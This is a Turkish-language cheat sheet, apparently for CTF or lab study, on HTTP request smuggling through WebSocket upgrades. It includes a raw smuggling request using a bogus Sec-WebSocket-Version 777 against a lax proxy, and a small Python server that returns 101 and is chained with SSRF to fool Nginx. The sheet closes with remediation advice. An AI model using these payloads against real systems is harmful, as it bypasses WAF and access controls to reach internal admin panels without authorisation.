# 🚀 WebSockets HTTP Request Smuggling - Technical Cheat Sheet

**Zorluk Seviyesi:** Premium / Advanced  
**Kategori:** Web Application Security, WebSocket Tunneling, Exploit Chaining (SSRF)  
**Temel Konsept:** WebSocket protokol değişimlerini (Upgrade) istismar ederek Ön Sunucuları (Proxy/WAF) kör etmek ve TCP seviyesinde gizli tüneller açmak.

---

## 📞 1. WebSockets ve Temel Zafiyet Mantığı

HTTP protokolü tek yönlüdür (İstemci sorar, sunucu yanıtlar ve bağlantı kapanır). **WebSockets (WS)** ise canlı ve çift yönlü (full-duplex) iletişim sağlar. 

**Handshake (El Sıkışma):** WebSocket bağlantısı her zaman standart bir HTTP isteğiyle başlar. İstemci `Upgrade: websocket` başlığını yollar. Sunucu bunu kabul ederse `101 Switching Protocols` yanıtı döner.
* **Zafiyetin Doğuşu:** Araya giren Ön Sunucular (Reverse Proxy / Load Balancer), bu "Upgrade" işlemini gördüklerinde trafiği denetlemeyi bırakır ve sadece doğrudan bir "Kablo (Blind Tunnel)" görevi görmeye başlarlar.

---

## 🥷 2. Sömürü Senaryoları (Exploitation Tactics)

### Senaryo A: Gevşek Yapılandırma (Örn: Varnish Proxy)
* **Durum:** Ön sunucu, arka sunucudan dönen yanıtın (Status Code) ne olduğuna bakmaksızın, sadece bir cevap geldiği için tüneli açıyorsa.
* **Saldırı Vektörü (Version 777 Bypass):**
  1. Saldırgan kasıtlı olarak geçersiz bir WebSocket sürümü gönderir: `Sec-WebSocket-Version: 777`.
  2. Arka sunucu bu sürümü tanımaz ve `426 Upgrade Required` hatası döner.
  3. Ön sunucu bu hatayı okumaz/umursamaz ve tüneli açıp denetimi bırakır.
  4. Saldırgan, açılan bu "Kör Tünel"in içine düz HTTP istekleri (Örn: `GET /flag HTTP/1.1`) fırlatarak yasaklı sayfalara Frontend WAF'a takılmadan erişir.

**Payload Örneği:**
```http
GET / HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: target.com
```

### Senaryo B: Sıkı Yapılandırma & SSRF Zinciri (Örn: Nginx)
* **Durum:** Nginx gibi modern proxy'ler arka sunucudan kesinlikle `101 Switching Protocols` yanıtının gelmesini bekler. Aksi halde tüneli açmaz.
* **Saldırı Vektörü (SSRF to WS Tunnel):**
  1. Hedef sistemde bir SSRF (Server-Side Request Forgery) zafiyeti bulunur (Örn: `/check-url?server=...`).
  2. Saldırgan kendi sunucusunda, kendisine gelen tüm isteklere `101 Switching Protocols` yanıtı dönen sahte bir Python sunucusu (Malicious HTTP Server) kurar.
  3. SSRF zafiyeti kullanılarak Arka Sunucu saldırganın sahte sunucusuna yönlendirilir.
  4. Sahte sunucu `101` döner. Arka sunucu bu `101` kodunu Nginx'e (Ön sunucuya) yansıtır.
  5. Nginx `101` onayını gördüğü için tüneli açar. Saldırgan yine tünelin içine `GET /admin` gibi kaçak HTTP isteklerini fırlatır!

**Sahte Sunucu (Python 101 Response):**
```python
class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()
```

---

## 🎯 3. Etki ve Sonuç (Impact)
Bu zafiyet başarıyla sömürüldüğünde, saldırgan:
1. Tüm Frontend Güvenlik Duvarlarını (WAF) ve Erişim Kontrol Listelerini (ACL) tamamen atlatır (Bypass).
2. Sadece dahili ağdan (Localhost) erişilebilen gizli yönetim panellerine (Admin Dashboard) sızar.
3. TCP seviyesinde "Kör Tünelleme" yaparak arka sunucuyla doğrudan ve denetimsiz HTTP iletişimi kurar.

---

## 🛠️ 4. Çözüm Önerileri (Remediation)
1. **Katı Yanıt Doğrulaması:** Ön sunucuların (Proxy), WebSocket tünelini başlatmadan önce arka sunucudan dönen yanıtın kesinlikle `101 Switching Protocols` olduğunu doğrulaması zorunlu kılınmalıdır (Varnish vb. sistemlerde yapılandırma sıkılaştırılmalıdır).
2. **SSRF Koruması:** Dışarıya giden (Outbound) istekler için beyaz liste (Whitelist) kullanılmalı, sunucunun internetteki rastgele IP adreslerine gitmesi engellenmelidir.
3. **HTTP/2 Kullanımı:** Mümkünse mimariyi uçtan uca HTTP/2 olarak güncelleyip, TCP seviyesindeki bu karmaşık protokol değişim (Upgrade) zafiyetlerini ortadan kaldırın.
